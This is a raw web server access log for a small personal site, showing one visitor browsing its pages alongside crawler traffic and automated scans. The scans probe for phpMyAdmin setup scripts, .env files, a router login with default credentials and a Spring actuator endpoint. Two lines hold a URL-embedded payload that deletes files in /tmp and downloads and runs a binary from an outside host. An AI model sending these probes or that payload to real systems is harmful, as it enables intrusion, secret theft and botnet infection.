59.92.44.149 - - [09/Sep/2022:07:15:19 +0000] "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0" 404 382 "-" "-"
128.14.141.34 - - [09/Sep/2022:07:30:39 +0000] "GET / HTTP/1.1" 200 941 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
101.43.68.37 - - [09/Sep/2022:07:41:23 +0000] "GET http://172.104.25.168:80/mysql/scripts/setup.php HTTP/1.0" 404 382 "-" "-"
101.43.68.37 - - [09/Sep/2022:07:41:24 +0000] "GET http://172.104.25.168:80/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 382 "-" "-"
101.43.68.37 - - [09/Sep/2022:07:41:25 +0000] "GET http://172.104.25.168:80/db/scripts/setup.php HTTP/1.0" 404 382 "-" "-"
101.43.68.37 - - [09/Sep/2022:07:41:23 +0000] "GET http://172.104.25.168:80/pma/scripts/setup.php HTTP/1.0" 404 382 "-" "-"
185.254.196.223 - - [09/Sep/2022:08:14:40 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [09/Sep/2022:08:14:40 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
197.63.236.232 - - [09/Sep/2022:08:34:19 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+81.161.229.46/jaws;sh+/tmp/jaws HTTP/1.1" 404 419 "-" "Hello, world"
197.63.236.232 - - [09/Sep/2022:08:34:20 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+81.161.229.46/jaws;sh+/tmp/jaws HTTP/1.1" 404 419 "-" "Hello, world"
154.198.211.133 - - [09/Sep/2022:08:39:08 +0000] "\x16\x03\x01" 400 488 "-" "-"
154.198.211.133 - - [09/Sep/2022:08:39:19 +0000] "GET / HTTP/1.1" 200 2559 "-" "-"
154.198.211.133 - - [09/Sep/2022:08:39:25 +0000] "GET /static/images/Endzone.jpg HTTP/1.1" 200 1473 "-" "Go-http-client/1.1"
154.198.211.133 - - [09/Sep/2022:08:39:25 +0000] "GET /robots.txt HTTP/1.1" 404 363 "-" "Go-http-client/1.1"
154.198.211.133 - - [09/Sep/2022:08:39:26 +0000] "GET /sitemap.xml HTTP/1.1" 404 363 "-" "Go-http-client/1.1"
80.94.92.231 - - [09/Sep/2022:09:03:04 +0000] "GET / HTTP/1.1" 200 2559 "-" "-"
152.89.196.62 - - [09/Sep/2022:09:22:48 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 960 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
94.102.49.193 - - [09/Sep/2022:09:43:56 +0000] "GET / HTTP/1.1" 200 2559 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
94.102.49.193 - - [09/Sep/2022:09:43:56 +0000] "GET /robots.txt HTTP/1.1" 404 363 "-" "-"
94.102.49.193 - - [09/Sep/2022:09:43:58 +0000] "GET /sitemap.xml HTTP/1.1" 404 363 "-" "-"
94.102.49.193 - - [09/Sep/2022:09:44:00 +0000] "GET /.well-known/security.txt HTTP/1.1" 404 363 "-" "-"
94.102.49.193 - - [09/Sep/2022:09:44:01 +0000] "GET /static/images/Endzone.jpg HTTP/1.1" 200 1529 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0"
94.102.49.193 - - [09/Sep/2022:09:44:02 +0000] "\x03\xe7\n" 400 488 "-" "-"
101.43.142.201 - - [09/Sep/2022:10:01:41 +0000] "GET http://172.104.25.168:80/mysql/scripts/setup.php HTTP/1.0" 404 382 "-" "-"
101.43.142.201 - - [09/Sep/2022:10:01:41 +0000] "GET http://172.104.25.168:80/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 382 "-" "-"
101.43.142.201 - - [09/Sep/2022:10:01:41 +0000] "GET http://172.104.25.168:80/pma/scripts/setup.php HTTP/1.0" 404 382 "-" "-"
101.43.142.201 - - [09/Sep/2022:10:01:41 +0000] "GET http://172.104.25.168:80/db/scripts/setup.php HTTP/1.0" 404 382 "-" "-"
192.241.208.156 - - [09/Sep/2022:10:09:24 +0000] "MGLNDD_172.104.25.168_80\n" 400 488 "-" "-"
35.233.62.116 - - [09/Sep/2022:10:24:23 +0000] "GET / HTTP/1.1" 200 997 "-" "python-requests/2.28.1"
35.233.62.116 - - [09/Sep/2022:10:26:04 +0000] "GET / HTTP/1.1" 200 997 "-" "python-requests/2.28.1"
152.89.196.62 - - [09/Sep/2022:10:27:37 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 382 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
167.94.138.45 - - [09/Sep/2022:11:01:11 +0000] "GET / HTTP/1.1" 200 2559 "-" "-"
167.94.138.45 - - [09/Sep/2022:11:01:11 +0000] "GET / HTTP/1.1" 200 941 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.45 - - [09/Sep/2022:11:01:11 +0000] "PRI * HTTP/2.0" 400 488 "-" "-"
167.94.138.45 - - [09/Sep/2022:11:01:11 +0000] "GET /static/images/Endzone.jpg HTTP/1.1" 200 1492 "-" "Go-http-client/1.1"
167.94.138.45 - - [09/Sep/2022:11:01:11 +0000] "GET /favicon.ico HTTP/1.1" 404 382 "-" "Go-http-client/1.1"
185.254.196.223 - - [09/Sep/2022:11:14:47 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [09/Sep/2022:11:14:47 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
101.35.161.133 - - [09/Sep/2022:11:41:30 +0000] "GET http://172.104.25.168:80/mysql/scripts/setup.php HTTP/1.0" 404 382 "-" "-"
101.35.161.133 - - [09/Sep/2022:11:41:30 +0000] "GET http://172.104.25.168:80/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 382 "-" "-"
101.35.161.133 - - [09/Sep/2022:11:41:30 +0000] "GET http://172.104.25.168:80/db/scripts/setup.php HTTP/1.0" 404 382 "-" "-"
101.35.161.133 - - [09/Sep/2022:11:41:31 +0000] "GET http://172.104.25.168:80/pma/scripts/setup.php HTTP/1.0" 404 382 "-" "-"
66.188.190.72 - - [09/Sep/2022:11:54:25 +0000] "GET / HTTP/1.1" 200 997 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1"
66.188.190.72 - - [09/Sep/2022:11:54:26 +0000] "GET /static/css/Home.css HTTP/1.1" 200 1233 "http://172.104.25.168/" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1"
66.188.190.72 - - [09/Sep/2022:11:54:26 +0000] "GET /static/css/nav.css HTTP/1.1" 200 1398 "http://172.104.25.168/" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1"
66.188.190.72 - - [09/Sep/2022:11:54:26 +0000] "GET /static/images/EndzoneLogo.png HTTP/1.1" 200 35260 "http://172.104.25.168/" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1"
66.188.190.72 - - [09/Sep/2022:11:54:26 +0000] "GET /static/images/HomeBackground_Iphone.jpg HTTP/1.1" 200 1127047 "http://172.104.25.168/" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1"
66.188.190.72 - - [09/Sep/2022:11:54:26 +0000] "GET /static/images/HomeBackground.jpg HTTP/1.1" 200 1151446 "http://172.104.25.168/" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1"
66.188.190.72 - - [09/Sep/2022:11:54:27 +0000] "GET /static/images/Endzone.jpg HTTP/1.1" 200 1529 "http://172.104.25.168/" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1"
66.188.190.72 - - [09/Sep/2022:12:03:05 +0000] "GET /Login HTTP/1.1" 200 899 "http://172.104.25.168/" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1"
66.188.190.72 - - [09/Sep/2022:12:03:05 +0000] "GET /static/css/Login.css HTTP/1.1" 200 1180 "http://172.104.25.168/Login" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1"
66.188.190.72 - - [09/Sep/2022:12:03:35 +0000] "POST /LoginAttempt HTTP/1.1" 302 740 "http://172.104.25.168/Login" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1"
66.188.190.72 - - [09/Sep/2022:12:03:35 +0000] "GET /Endzone/Hub HTTP/1.1" 200 888 "http://172.104.25.168/Login" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1"
66.188.190.72 - - [09/Sep/2022:12:03:35 +0000] "GET /static/css/Hub.css HTTP/1.1" 200 704 "http://172.104.25.168/Endzone/Hub" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1"
66.188.190.72 - - [09/Sep/2022:12:03:35 +0000] "GET /static/css/nav.css HTTP/1.1" 200 1398 "http://172.104.25.168/Endzone/Hub" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1"
66.188.190.72 - - [09/Sep/2022:12:03:35 +0000] "GET /static/images/EndzoneLogo.png HTTP/1.1" 304 275 "http://172.104.25.168/Endzone/Hub" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1"
66.188.190.72 - - [09/Sep/2022:12:03:41 +0000] "GET /Endzone/KIPP HTTP/1.1" 200 1814 "http://172.104.25.168/Endzone/Hub" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1"
66.188.190.72 - - [09/Sep/2022:12:03:41 +0000] "GET /static/css/KIPP.css HTTP/1.1" 200 1088 "http://172.104.25.168/Endzone/KIPP" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1"
66.188.190.72 - - [09/Sep/2022:12:03:41 +0000] "GET /static/images/EndzoneLogo.png HTTP/1.1" 304 275 "http://172.104.25.168/Endzone/KIPP" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1"
66.188.190.72 - - [09/Sep/2022:12:03:41 +0000] "GET /static/js/KIPP.js HTTP/1.1" 200 704 "http://172.104.25.168/Endzone/KIPP" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1"
66.188.190.72 - - [09/Sep/2022:12:03:41 +0000] "GET /static/css/nav.css HTTP/1.1" 200 1398 "http://172.104.25.168/Endzone/KIPP" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1"
66.188.190.72 - - [09/Sep/2022:12:03:41 +0000] "GET /static/images/KIPP_Background.jpg HTTP/1.1" 200 2078976 "http://172.104.25.168/Endzone/KIPP" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1"
66.188.190.72 - - [09/Sep/2022:12:04:25 +0000] "POST /Endzone/KIPP/Run HTTP/1.1" 200 332333 "http://172.104.25.168/Endzone/KIPP" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1"
66.188.190.72 - - [09/Sep/2022:12:05:10 +0000] "GET /Endzone/TARS HTTP/1.1" 200 2376 "http://172.104.25.168/Endzone/KIPP" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1"
66.188.190.72 - - [09/Sep/2022:12:05:10 +0000] "GET /static/css/TARS.css HTTP/1.1" 200 1325 "http://172.104.25.168/Endzone/TARS" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1"
